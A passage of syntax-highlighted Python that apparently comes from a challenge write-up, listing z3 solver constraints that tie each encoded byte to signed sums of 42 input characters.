c[</span><br><span class="line">                                              <span class="hljs-number">0x15</span>]) + c[<span class="hljs-number">0x16</span>]) - c[<span class="hljs-number">0x17</span>]) + c[<span class="hljs-number">0x18</span>] + c[<span class="hljs-number">0x19</span>]) - c[<span class="hljs-number">0x1a</span>]) + c[<span class="hljs-number">0x1b</span>]) -</span><br><span class="line">                                    c[<span class="hljs-number">0x1c</span>]) + c[<span class="hljs-number">0x1d</span>] + c[<span class="hljs-number">0x1e</span>]) - c[<span class="hljs-number">0x1f</span>]) - c[<span class="hljs-number">0x20</span>]) - c[<span class="hljs-number">0x21</span>]) - c[<span class="hljs-number">0x22</span>]) - c[</span><br><span class="line">                                  <span class="hljs-number">0x23</span>]) - c[<span class="hljs-number">0x24</span>]) - c[<span class="hljs-number">0x25</span>]) + c[<span class="hljs-number">0x26</span>]) - c[<span class="hljs-number">0x27</span>]) - c[<span class="hljs-number">0x28</span>]) - c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0x18</span>] == (((((((((((((((((((((((((c[<span class="hljs-number">0</span>] + c[<span class="hljs-number">1</span>]) - c[<span class="hljs-number">2</span>]) + c[<span class="hljs-number">3</span>] + c[<span class="hljs-number">4</span>]) - c[<span class="hljs-number">5</span>]) + c[<span class="hljs-number">6</span>] + c[<span class="hljs-number">7</span>]) - c[<span class="hljs-number">8</span>]) + c[</span><br><span class="line">    <span class="hljs-number">9</span>] + c[<span class="hljs-number">10</span>]) - c[<span class="hljs-number">0xb</span>]) - c[<span class="hljs-number">0xc</span>]) - c[<span class="hljs-number">0xd</span>]) - c[<span class="hljs-number">0xe</span>]) + c[<span class="hljs-number">0xf</span>] + c[<span class="hljs-number">0x10</span>] + c[<span class="hljs-number">0x11</span>]) - c[<span class="hljs-number">0x12</span>]) + c[<span class="hljs-number">0x13</span>] + c[<span class="hljs-number">0x14</span>] +</span><br><span class="line">                                    c[<span class="hljs-number">0x15</span>] + c[<span class="hljs-number">0x16</span>] + c[<span class="hljs-number">0x17</span>] + c[<span class="hljs-number">0x18</span>] + c[<span class="hljs-number">0x19</span>]) - c[<span class="hljs-number">0x1a</span>]) - c[<span class="hljs-number">0x1b</span>]) - c[<span class="hljs-number">0x1c</span>]) +</span><br><span class="line">                                c[<span class="hljs-number">0x1d</span>] + c[<span class="hljs-number">0x1e</span>]) - c[<span class="hljs-number">0x1f</span>]) + c[<span class="hljs-number">0x20</span>] + c[<span class="hljs-number">0x21</span>] + c[<span class="hljs-number">0x22</span>]) - c[<span class="hljs-number">0x23</span>]) - c[<span class="hljs-number">0x24</span>]) - c[</span><br><span class="line">                               <span class="hljs-number">0x25</span>]) - c[<span class="hljs-number">0x26</span>]) + c[<span class="hljs-number">0x27</span>] + c[<span class="hljs-number">0x28</span>]) - c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0x19</span>] == ((((((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] - c[<span class="hljs-number">1</span>]) + c[<span class="hljs-number">2</span>] + c[<span class="hljs-number">3</span>]) - c[<span class="hljs-number">4</span>]) + c[<span class="hljs-number">5</span>] + c[<span class="hljs-number">6</span>]) - c[<span class="hljs-number">7</span>]) + c[</span><br><span class="line">    <span class="hljs-number">8</span>] + c[<span class="hljs-number">9</span>] + c[<span class="hljs-number">10</span>]) - c[<span class="hljs-number">0xb</span>]) - c[<span class="hljs-number">0xc</span>]) + c[<span class="hljs-number">0xd</span>]) - c[<span class="hljs-number">0xe</span>]) + c[<span class="hljs-number">0xf</span>]) - c[<span class="hljs-number">0x10</span>]) + c[<span class="hljs-number">0x11</span>] + c[<span class="hljs-number">0x12</span>] + c[<span class="hljs-number">0x13</span>]) - c[</span><br><span class="line">                                               <span class="hljs-number">0x14</span>]) - c[<span class="hljs-number">0x15</span>]) + c[<span class="hljs-number">0x16</span>] + c[<span class="hljs-number">0x17</span>]) - c[<span class="hljs-number">0x18</span>]) - c[<span class="hljs-number">0x19</span>]) + c[<span class="hljs-number">0x1a</span>]) -</span><br><span class="line">                                     c[<span class="hljs-number">0x1b</span>]) + c[<span class="hljs-number">0x1c</span>]) - c[<span class="hljs-number">0x1d</span>]) + c[<span class="hljs-number">0x1e</span>]) - c[<span class="hljs-number">0x1f</span>]) - c[<span class="hljs-number">0x20</span>]) + c[<span class="hljs-number">0x21</span>]) - c[</span><br><span class="line">                                  <span class="hljs-number">0x22</span>]) - c[<span class="hljs-number">0x23</span>]) - c[<span class="hljs-number">0x24</span>]) - c[<span class="hljs-number">0x25</span>]) + c[<span class="hljs-number">0x26</span>]) - c[<span class="hljs-number">0x27</span>]) + c[<span class="hljs-number">0x28</span>] + c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0x1a</span>] == (((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] + c[<span class="hljs-number">1</span>] + c[<span class="hljs-number">2</span>] + c[<span class="hljs-number">3</span>] + c[<span class="hljs-number">4</span>]) - c[<span class="hljs-number">5</span>]) - c[<span class="hljs-number">6</span>]) + c[<span class="hljs-number">7</span>]) - c[<span class="hljs-number">8</span>]) -</span><br><span class="line">                                                c[<span class="hljs-number">9</span>]) - c[<span class="hljs-number">10</span>]) - c[<span class="hljs-number">0xb</span>]) + c[<span class="hljs-number">0xc</span>]) - c[<span class="hljs-number">0xd</span>]) + c[<span class="hljs-number">0xe</span>]) - c[<span class="hljs-number">0xf</span>]) + c[</span><br><span class="line">                                             <span class="hljs-number">0x10</span>]) - c[<span class="hljs-number">0x11</span>]) + c[<span class="hljs-number">0x12</span>]) - c[<span class="hljs-number">0x13</span>]) - c[<span class="hljs-number">0x14</span>]) + c[<span class="hljs-number">0x15</span>] + c[<span class="hljs-number">0x16</span>] + c[</span><br><span class="line">                                        <span class="hljs-number">0x17</span>] + c[<span class="hljs-number">0x18</span>] + c[<span class="hljs-number">0x19</span>]) - c[<span class="hljs-number">0x1a</span>]) - c[<span class="hljs-number">0x1b</span>]) - c[<span class="hljs-number">0x1c</span>]) - c[<span class="hljs-number">0x1d</span>]) + c[</span><br><span class="line">                                   <span class="hljs-number">0x1e</span>] + c[<span class="hljs-number">0x1f</span>]) - c[<span class="hljs-number">0x20</span>]) - c[<span class="hljs-number">0x21</span>]) - c[<span class="hljs-number">0x22</span>]) + c[<span class="hljs-number">0x23</span>] + c[<span class="hljs-number">0x24</span>]) - c[<span class="hljs-number">0x25</span>]) -</span><br><span class="line">                         c[<span class="hljs-number">0x26</span>]) + c[<span class="hljs-number">0x27</span>] + c[<span class="hljs-number">0x28</span>] + c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0x1b</span>] == (((((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] - c[<span class="hljs-number">1</span>]) + c[<span class="hljs-number">2</span>]) - c[<span class="hljs-number">3</span>]) + c[<span class="hljs-number">4</span>]) - c[<span class="hljs-number">5</span>]) - c[<span class="hljs-number">6</span>]) - c[<span class="hljs-number">7</span>]) - c[</span><br><span class="line">    <span class="hljs-number">8</span>]) - c[<span class="hljs-number">9</span>]) - c[<span class="hljs-number">10</span>]) - c[<span class="hljs-number">0xb</span>]) + c[<span class="hljs-number">0xc</span>] + c[<span class="hljs-number">0xd</span>]) - c[<span class="hljs-number">0xe</span>]) + c[<span class="hljs-number">0xf</span>] + c[<span class="hljs-number">0x10</span>] + c[<span class="hljs-number">0x11</span>] + c[<span class="hljs-number">0x12</span>] + c[<span class="hljs-number">0x13</span>]) - c[</span><br><span class="line">                                             <span class="hljs-number">0x14</span>]) - c[<span class="hljs-number">0x15</span>]) - c[<span class="hljs-number">0x16</span>]) - c[<span class="hljs-number">0x17</span>]) + c[<span class="hljs-number">0x18</span>] + c[<span class="hljs-number">0x19</span>] + c[<span class="hljs-number">0x1a</span>]) - c[</span><br><span class="line">                                        <span class="hljs-number">0x1b</span>]) + c[<span class="hljs-number">0x1c</span>] + c[<span class="hljs-number">0x1d</span>] + c[<span class="hljs-number">0x1e</span>]) - c[<span class="hljs-number">0x1f</span>]) - c[<span class="hljs-number">0x20</span>]) - c[<span class="hljs-number">0x21</span>]) - c[</span><br><span class="line">                                   <span class="hljs-number">0x22</span>]) + c[<span class="hljs-number">0x23</span>]) - c[<span class="hljs-number">0x24</span>]) - c[<span class="hljs-number">0x25</span>]) - c[<span class="hljs-number">0x26</span>]) - c[<span class="hljs-number">0x27</span>]) - c[<span class="hljs-number">0x28</span>]) - c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0x1c</span>] == ((((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] - c[<span class="hljs-number">1</span>]) + c[<span class="hljs-number">2</span>] + c[<span class="hljs-number">3</span>] + c[<span class="hljs-number">4</span>]) - c[<span class="hljs-number">5</span>]) + c[<span class="hljs-number">6</span>] + c[<span class="hljs-number">7</span>]) - c[</span><br><span class="line">    <span class="hljs-number">8</span>]) - c[<span class="hljs-number">9</span>]) + c[<span class="hljs-number">10</span>] + c[<span class="hljs-number">0xb</span>]) - c[<span class="hljs-number">0xc</span>]) + c[<span class="hljs-number">0xd</span>]) - c[<span class="hljs-number">0xe</span>]) + c[<span class="hljs-number">0xf</span>]) - c[<span class="hljs-number">0x10</span>]) + c[<span class="hljs-number">0x11</span>] + c[<span class="hljs-number">0x12</span>] + c[<span class="hljs-number">0x13</span>]) - c[</span><br><span class="line">                                             <span class="hljs-number">0x14</span>]) - c[<span class="hljs-number">0x15</span>]) + c[<span class="hljs-number">0x16</span>]) - c[<span class="hljs-number">0x17</span>]) - c[<span class="hljs-number">0x18</span>]) - c[<span class="hljs-number">0x19</span>]) - c[<span class="hljs-number">0x1a</span>]) +</span><br><span class="line">                                  c[<span class="hljs-number">0x1b</span>]) - c[<span class="hljs-number">0x1c</span>]) - c[<span class="hljs-number">0x1d</span>]) - c[<span class="hljs-number">0x1e</span>]) + c[<span class="hljs-number">0x1f</span>]) - c[<span class="hljs-number">0x20</span>]) - c[<span class="hljs-number">0x21</span>]) + c[<span class="hljs-number">0x22</span>] +</span><br><span class="line">                           c[<span class="hljs-number">0x23</span>] + c[<span class="hljs-number">0x24</span>]) - c[<span class="hljs-number">0x25</span>]) - c[<span class="hljs-number">0x26</span>]) + c[<span class="hljs-number">0x27</span>] + c[<span class="hljs-number">0x28</span>] + c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0x1d</span>] == ((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] + c[<span class="hljs-number">1</span>]) - c[<span class="hljs-number">2</span>]) - c[<span class="hljs-number">3</span>]) - c[<span class="hljs-number">4</span>]) + c[<span class="hljs-number">5</span>] + c[<span class="hljs-number">6</span>] + c[<span class="hljs-number">7</span>]) - c[<span class="hljs-number">8</span>]) +</span><br><span class="line">                                            c[<span class="hljs-number">9</span>]) - c[<span class="hljs-number">10</span>]) - c[<span class="hljs-number">0xb</span>]) + c[<span class="hljs-number">0xc</span>]) - c[<span class="hljs-number">0xd</span>]) + c[<span class="hljs-number">0xe</span>] + c[<span class="hljs-number">0xf</span>]) - c[<span class="hljs-number">0x10</span>]) +</span><br><span class="line">                                     c[<span class="hljs-number">0x11</span>] + c[<span class="hljs-number">0x12</span>]) - c[<span class="hljs-number">0x13</span>]) + c[<span class="hljs-number">0x14</span>] + c[<span class="hljs-number">0x15</span>] + c[<span class="hljs-number">0x16</span>] + c[<span class="hljs-number">0x17</span>]) - c[<span class="hljs-number">0x18</span>]) +</span><br><span class="line">                                 c[<span class="hljs-number">0x19</span>] + c[<span class="hljs-number">0x1a</span>]) - c[<span class="hljs-number">0x1b</span>]) + c[<span class="hljs-number">0x1c</span>] + c[<span class="hljs-number">0x1d</span>] + c[<span class="hljs-number">0x1e</span>] + c[<span class="hljs-number">0x1f</span>] + c[<span class="hljs-number">0x20</span>]) - c[</span><br><span class="line">                                  <span class="hljs-number">0x21</span>]) - c[<span class="hljs-number">0x22</span>]) + c[<span class="hljs-number">0x23</span>] + c[<span class="hljs-number">0x24</span>]) - c[<span class="hljs-number">0x25</span>]) + c[<span class="hljs-number">0x26</span>] + c[<span class="hljs-number">0x27</span>]) - c[<span class="hljs-number">0x28</span>]) + c[</span><br><span class="line">               <span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0x1e</span>] == ((((((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] + c[<span class="hljs-number">1</span>] + c[<span class="hljs-number">2</span>] + c[<span class="hljs-number">3</span>]) - c[<span class="hljs-number">4</span>]) - c[<span class="hljs-number">5</span>]) - c[<span class="hljs-number">6</span>]) - c[<span class="hljs-number">7</span>]) + c[</span><br><span class="line">    <span class="hljs-number">8</span>] + c[<span class="hljs-number">9</span>]) - c[<span class="hljs-number">10</span>]) - c[<span class="hljs-number">0xb</span>]) - c[<span class="hljs-number">0xc</span>]) + c[<span class="hljs-number">0xd</span>]) - c[<span class="hljs-number">0xe</span>]) - c[<span class="hljs-number">0xf</span>]) + c[<span class="hljs-number">0x10</span>]) - c[<span class="hljs-number">0x11</span>]) - c[<span class="hljs-number">0x12</span>]) - c[<span class="hljs-number">0x13</span>]) +</span><br><span class="line">                                        c[<span class="hljs-number">0x14</span>]) - c[<span class="hljs-number">0x15</span>]) - c[<span class="hljs-number">0x16</span>]) + c[<span class="hljs-number">0x17</span>] + c[<span class="hljs-number">0x18</span>]) - c[<span class="hljs-number">0x19</span>]) - c[<span class="hljs-number">0x1a</span>]) + c[</span><br><span class="line">                                      <span class="hljs-number">0x1b</span>]) - c[<span class="hljs-number">0x1c</span>]) - c[<span class="hljs-number">0x1d</span>]) - c[<span class="hljs-number">0x1e</span>]) - c[<span class="hljs-number">0x1f</span>]) - c[<span class="hljs-number">0x20</span>]) - c[<span class="hljs-number">0x21</span>]) - c[</span><br><span class="line">                               <span class="hljs-number">0x22</span>]) + c[<span class="hljs-number">0x23</span>] + c[<span class="hljs-number">0x24</span>] + c[<span class="hljs-number">0x25</span>]) - c[<span class="hljs-number">0x26</span>]) + c[<span class="hljs-number">0x27</span>] + c[<span class="hljs-number">0x28</span>] + c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0x1f</span>] == ((((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] + c[<span class="hljs-number">1</span>]) - c[<span class="hljs-number">2</span>]) + c[<span class="hljs-number">3</span>] + c[<span class="hljs-number">4</span>]) - c[<span class="hljs-number">5</span>]) - c[<span class="hljs-number">6</span>]) + c[<span class="hljs-number">7</span>] + c[</span><br><span class="line">    <span class="hljs-number">8</span>] + c[<span class="hljs-number">9</span>] + c[<span class="hljs-number">10</span>] + c[<span class="hljs-number">0xb</span>] + c[<span class="hljs-number">0xc</span>]) - c[<span class="hljs-number">0xd</span>]) - c[<span class="hljs-number">0xe</span>]) - c[<span class="hljs-number">0xf</span>]) + c[<span class="hljs-number">0x10</span>] + c[<span class="hljs-number">0x11</span>] + c[<span class="hljs-number">0x12</span>] + c[<span class="hljs-number">0x13</span>]) - c[</span><br><span class="line">                                                <span class="hljs-number">0x14</span>]) + c[<span class="hljs-number">0x15</span>]) - c[<span class="hljs-number">0x16</span>]) + c[<span class="hljs-number">0x17</span>]) - c[<span class="hljs-number">0x18</span>]) - c[<span class="hljs-number">0x19</span>]) + c[</span><br><span class="line">                                          <span class="hljs-number">0x1a</span>] + c[<span class="hljs-number">0x1b</span>]) - c[<span class="hljs-number">0x1c</span>]) + c[<span class="hljs-number">0x1d</span>]) - c[<span class="hljs-number">0x1e</span>]) - c[<span class="hljs-number">0x1f</span>]) - c[<span class="hljs-number">0x20</span>]) + c[</span><br><span class="line">                                    <span class="hljs-number">0x21</span>]) - c[<span class="hljs-number">0x22</span>]) + c[<span class="hljs-number">0x23</span>]) - c[<span class="hljs-number">0x24</span>]) + c[<span class="hljs-number">0x25</span>]) - c[<span class="hljs-number">0x26</span>]) + c[<span class="hljs-number">0x27</span>]) - c[</span><br><span class="line">                             <span class="hljs-number">0x28</span>]) - c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0x20</span>] == (((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] - c[<span class="hljs-number">1</span>]) + c[<span class="hljs-number">2</span>] + c[<span class="hljs-number">3</span>]) - c[<span class="hljs-number">4</span>]) + c[<span class="hljs-number">5</span>] + c[<span class="hljs-number">6</span>] + c[<span class="hljs-number">7</span>] + c[<span class="hljs-number">8</span>]) - c[</span><br><span class="line">    <span class="hljs-number">9</span>]) + c[<span class="hljs-number">10</span>] + c[<span class="hljs-number">0xb</span>]) - c[<span class="hljs-number">0xc</span>]) + c[<span class="hljs-number">0xd</span>] + c[<span class="hljs-number">0xe</span>]) - c[<span class="hljs-number">0xf</span>]) + c[<span class="hljs-number">0x10</span>]) - c[<span class="hljs-number">0x11</span>]) + c[<span class="hljs-number">0x12</span>] + c[<span class="hljs-number">0x13</span>] + c[<span class="hljs-number">0x14</span>]) -</span><br><span class="line">                                       c[<span class="hljs-number">0x15</span>]) - c[<span class="hljs-number">0x16</span>]) + c[<span class="hljs-number">0x17</span>]) - c[<span class="hljs-number">0x18</span>]) + c[<span class="hljs-number">0x19</span>] + c[<span class="hljs-number">0x1a</span>] + c[<span class="hljs-number">0x1b</span>]) - c[</span><br><span class="line">                                      <span class="hljs-number">0x1c</span>]) - c[<span class="hljs-number">0x1d</span>]) - c[<span class="hljs-number">0x1e</span>]) - c[<span class="hljs-number">0x1f</span>]) - c[<span class="hljs-number">0x20</span>]) - c[<span class="hljs-number">0x21</span>]) + c[<span class="hljs-number">0x22</span>] + c[</span><br><span class="line">                                <span class="hljs-number">0x23</span>] + c[<span class="hljs-number">0x24</span>] + c[<span class="hljs-number">0x25</span>]) - c[<span class="hljs-number">0x26</span>]) + c[<span class="hljs-number">0x27</span>]) - c[<span class="hljs-number">0x28</span>]) + c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0x21</span>] == (((((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] - c[<span class="hljs-number">1</span>]) - c[<span class="hljs-number">2</span>]) + c[<span class="hljs-number">3</span>] + c[<span class="hljs-number">4</span>] + c[<span class="hljs-number">5</span>] + c[<span class="hljs-number">6</span>]) - c[<span class="hljs-number">7</span>]) - c[</span><br><span class="line">    <span class="hljs-number">8</span>]) + c[<span class="hljs-number">9</span>] + c[<span class="hljs-number">10</span>] + c[<span class="hljs-number">0xb</span>]) - c[<span class="hljs-number">0xc</span>]) - c[<span class="hljs-number">0xd</span>]) + c[<span class="hljs-number">0xe</span>] + c[<span class="hljs-number">0xf</span>]) - c[<span class="hljs-number">0x10</span>]) + c[<span class="hljs-number">0x11</span>]) - c[<span class="hljs-number">0x12</span>]) + c[<span class="hljs-number">0x13</span>]) - c[</span><br><span class="line">                                              <span class="hljs-number">0x14</span>]) + c[<span class="hljs-number">0x15</span>] + c[<span class="hljs-number">0x16</span>] + c[<span class="hljs-number">0x17</span>]) - c[<span class="hljs-number">0x18</span>]) - c[<span class="hljs-number">0x19</span>]) + c[<span class="hljs-number">0x1a</span>] + c[</span><br><span class="line">                                          <span class="hljs-number">0x1b</span>]) - c[<span class="hljs-number">0x1c</span>]) + c[<span class="hljs-number">0x1d</span>]) - c[<span class="hljs-number">0x1e</span>]) - c[<span class="hljs-number">0x1f</span>]) - c[<span class="hljs-number">0x20</span>]) - c[<span class="hljs-number">0x21</span>]) - c[</span><br><span class="line">                                   <span class="hljs-number">0x22</span>]) - c[<span class="hljs-number">0x23</span>]) + c[<span class="hljs-number">0x24</span>]) - c[<span class="hljs-number">0x25</span>]) + c[<span class="hljs-number">0x26</span>]) - c[<span class="hljs-number">0x27</span>]) - c[<span class="hljs-number">0x28</span>]) - c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0x22</span>] == ((((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] + c[<span class="hljs-number">1</span>]) - c[<span class="hljs-number">2</span>]) + c[<span class="hljs-number">3</span>]) - c[<span class="hljs-number">4</span>]) - c[<span class="hljs-number">5</span>]) - c[<span class="hljs-number">6</span>]) + c[<span class="hljs-number">7</span>] + c[</span><br><span class="line">    <span class="hljs-number">8</span>] + c[<span class="hljs-number">9</span>] + c[<span class="hljs-number">10</span>] + c[<span class="hljs-number">0xb</span>]) - c[<span class="hljs-number">0xc</span>]) - c[<span class="hljs-number">0xd</span>]) - c[<span class="hljs-number">0xe</span>]) + c[<span class="hljs-number">0xf</span>]) - c[<span class="hljs-number">0x10</span>]) + c[<span class="hljs-number">0x11</span>]) - c[<span class="hljs-number">0x12</span>]) + c[<span class="hljs-number">0x13</span>]) - c[</span><br><span class="line">                                           <span class="hljs-number">0x14</span>]) - c[<span class="hljs-number">0x15</span>]) + c[<span class="hljs-number">0x16</span>] + c[<span class="hljs-number">0x17</span>]) - c[<span class="hljs-number">0x18</span>]) - c[<span class="hljs-number">0x19</span>]) + c[<span class="hljs-number">0x1a</span>] + c[</span><br><span class="line">                                      <span class="hljs-number">0x1b</span>] + c[<span class="hljs-number">0x1c</span>] + c[<span class="hljs-number">0x1d</span>]) - c[<span class="hljs-number">0x1e</span>]) - c[<span class="hljs-number">0x1f</span>]) - c[<span class="hljs-number">0x20</span>]) - c[<span class="hljs-number">0x21</span>]) - c[</span><br><span class="line">                                 <span class="hljs-number">0x22</span>]) - c[<span class="hljs-number">0x23</span>]) - c[<span class="hljs-number">0x24</span>]) + c[<span class="hljs-number">0x25</span>] + c[<span class="hljs-number">0x26</span>] + c[<span class="hljs-number">0x27</span>]) - c[<span class="hljs-number">0x28</span>]) - c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0x23</span>] == ((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] - c[<span class="hljs-number">1</span>]) + c[<span class="hljs-number">2</span>] + c[<span class="hljs-number">3</span>] + c[<span class="hljs-number">4</span>]) - c[<span class="hljs-number">5</span>]) - c[<span class="hljs-number">6</span>]) + c[<span class="hljs-number">7</span>] + c[<span class="hljs-number">8</span>]) - c[</span><br><span class="line">    <span class="hljs-number">9</span>]) - c[<span class="hljs-number">10</span>]) + c[<span class="hljs-number">0xb</span>] + c[<span class="hljs-number">0xc</span>] + c[<span class="hljs-number">0xd</span>]) - c[<span class="hljs-number">0xe</span>]) - c[<span class="hljs-number">0xf</span>]) + c[<span class="hljs-number">0x10</span>]) - c[<span class="hljs-number">0x11</span>]) + c[<span class="hljs-number">0x12</span>] + c[<span class="hljs-number">0x13</span>]) - c[<span class="hljs-number">0x14</span>]) -</span><br><span class="line">                                    c[<span class="hljs-number">0x15</span>]) - c[<span class="hljs-number">0x16</span>]) + c[<span class="hljs-number">0x17</span>] + c[<span class="hljs-number">0x18</span>]) - c[<span class="hljs-number">0x19</span>]) - c[<span class="hljs-number">0x1a</span>]) + c[<span class="hljs-number">0x1b</span>] + c[</span><br><span class="line">                                   <span class="hljs-number">0x1c</span>]) - c[<span class="hljs-number">0x1d</span>]) - c[<span class="hljs-number">0x1e</span>]) + c[<span class="hljs-number">0x1f</span>] + c[<span class="hljs-number">0x20</span>]) - c[<span class="hljs-number">0x21</span>]) + c[<span class="hljs-number">0x22</span>] + c[<span class="hljs-number">0x23</span>] + c[</span><br><span class="line">                              <span class="hljs-number">0x24</span>] + c[<span class="hljs-number">0x25</span>] + c[<span class="hljs-number">0x26</span>] + c[<span class="hljs-number">0x27</span>]) - c[<span class="hljs-number">0x28</span>]) - c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0x24</span>] == (((((((((((((((((((((((((c[<span class="hljs-number">0</span>] + c[<span class="hljs-number">1</span>] + c[<span class="hljs-number">2</span>]) - c[<span class="hljs-number">3</span>]) - c[<span class="hljs-number">4</span>]) - c[<span class="hljs-number">5</span>]) - c[<span class="hljs-number">6</span>]) + c[<span class="hljs-number">7</span>] + c[<span class="hljs-number">8</span>] + c[</span><br><span class="line">    <span class="hljs-number">9</span>]) - c[<span class="hljs-number">10</span>]) + c[<span class="hljs-number">0xb</span>] + c[<span class="hljs-number">0xc</span>]) - c[<span class="hljs-number">0xd</span>]) + c[<span class="hljs-number">0xe</span>] + c[<span class="hljs-number">0xf</span>] + c[<span class="hljs-number">0x10</span>] + c[<span class="hljs-number">0x11</span>] + c[<span class="hljs-number">0x12</span>] + c[<span class="hljs-number">0x13</span>] + c[<span class="hljs-number">0x14</span>] + c[</span><br><span class="line">                                            <span class="hljs-number">0x15</span>]) - c[<span class="hljs-number">0x16</span>]) - c[<span class="hljs-number">0x17</span>]) + c[<span class="hljs-number">0x18</span>]) - c[<span class="hljs-number">0x19</span>]) - c[<span class="hljs-number">0x1a</span>]) - c[<span class="hljs-number">0x1b</span>]) -</span><br><span class="line">                                 c[<span class="hljs-number">0x1c</span>]) + c[<span class="hljs-number">0x1d</span>] + c[<span class="hljs-number">0x1e</span>] + c[<span class="hljs-number">0x1f</span>] + c[<span class="hljs-number">0x20</span>]) - c[<span class="hljs-number">0x21</span>]) - c[<span class="hljs-number">0x22</span>]) - c[<span class="hljs-number">0x23</span>]) - c[</span><br><span class="line">                                <span class="hljs-number">0x24</span>]) + c[<span class="hljs-number">0x25</span>]) - c[<span class="hljs-number">0x26</span>]) + c[<span class="hljs-number">0x27</span>] + c[<span class="hljs-number">0x28</span>]) - c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0x25</span>] == ((((((((((((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] - c[<span class="hljs-number">1</span>]) - c[<span class="hljs-number">2</span>]) + c[<span class="hljs-number">3</span>]) - c[<span class="hljs-number">4</span>]) + c[<span class="hljs-number">5</span>]) - c[<span class="hljs-number">6</span>]) - c[</span><br><span class="line">    <span class="hljs-number">7</span>]) - c[<span class="hljs-number">8</span>]) - c[<span class="hljs-number">9</span>]) + c[<span class="hljs-number">10</span>]) - c[<span class="hljs-number">0xb</span>]) - c[<span class="hljs-number">0xc</span>]) - c[<span class="hljs-number">0xd</span>]) - c[<span class="hljs-number">0xe</span>]) - c[<span class="hljs-number">0xf</span>]) - c[<span class="hljs-number">0x10</span>]) + c[<span class="hljs-number">0x11</span>] + c[<span class="hljs-number">0x12</span>]) - c[</span><br><span class="line">                                                 <span class="hljs-number">0x13</span>]) - c[<span class="hljs-number">0x14</span>]) - c[<span class="hljs-number">0x15</span>]) + c[<span class="hljs-number">0x16</span>]) - c[<span class="hljs-number">0x17</span>]) + c[<span class="hljs-number">0x18</span>]) - c[</span><br><span class="line">                                           <span class="hljs-number">0x19</span>]) - c[<span class="hljs-number">0x1a</span>]) + c[<span class="hljs-number">0x1b</span>]) - c[<span class="hljs-number">0x1c</span>]) - c[<span class="hljs-number">0x1d</span>]) + c[<span class="hljs-number">0x1e</span>] + c[<span class="hljs-number">0x1f</span>]) - c[</span><br><span class="line">                                     <span class="hljs-number">0x20</span>]) + c[<span class="hljs-number">0x21</span>]) - c[<span class="hljs-number">0x22</span>]) + c[<span class="hljs-number">0x23</span>]) - c[<span class="hljs-number">0x24</span>]) - c[<span class="hljs-number">0x25</span>]) + c[<span class="hljs-number">0x26</span>]) - c[</span><br><span class="line">                              <span class="hljs-number">0x27</span>]) - c[<span class="hljs-number">0x28</span>]) - c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0x26</span>] == ((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] + c[<span class="hljs-number">1</span>] + c[<span class="hljs-number">2</span>] + c[<span class="hljs-number">3</span>]) - c[<span class="hljs-number">4</span>]) + c[<span class="hljs-number">5</span>] + c[<span class="hljs-number">6</span>] + c[<span class="hljs-number">7</span>]) - c[<span class="hljs-number">8</span>]) - c[</span><br><span class="line">    <span class="hljs-number">9</span>]) - c[<span class="hljs-number">10</span>]) + c[<span class="hljs-number">0xb</span>] + c[<span class="hljs-number">0xc</span>] + c[<span class="hljs-number">0xd</span>]) - c[<span class="hljs-number">0xe</span>]) - c[<span class="hljs-number">0xf</span>]) - c[<span class="hljs-number">0x10</span>]) - c[<span class="hljs-number">0x11</span>]) - c[<span class="hljs-number">0x12</span>]) - c[<span class="hljs-number">0x13</span>]) + c[<span class="hljs-number">0x14</span>] +</span><br><span class="line">                                     c[<span class="hljs-number">0x15</span>]) - c[<span class="hljs-number">0x16</span>]) + c[<span class="hljs-number">0x17</span>] + c[<span class="hljs-number">0x18</span>] + c[<span class="hljs-number">0x19</span>] + c[<span class="hljs-number">0x1a</span>] + c[<span class="hljs-number">0x1b</span>]) - c[<span class="hljs-number">0x1c</span>]) -</span><br><span class="line">                                 c[<span class="hljs-number">0x1d</span>]) + c[<span class="hljs-number">0x1e</span>] + c[<span class="hljs-number">0x1f</span>]) - c[<span class="hljs-number">0x20</span>]) - c[<span class="hljs-number">0x21</span>]) + c[<span class="hljs-number">0x22</span>]) - c[<span class="hljs-number">0x23</span>]) - c[<span class="hljs-number">0x24</span>]) -</span><br><span class="line">                          c[<span class="hljs-number">0x25</span>]) + c[<span class="hljs-number">0x26</span>] + c[<span class="hljs-number">0x27</span>] + c[<span class="hljs-number">0x28</span>]) - c[<span class="hljs-number">0x29</span>])</span><br><span 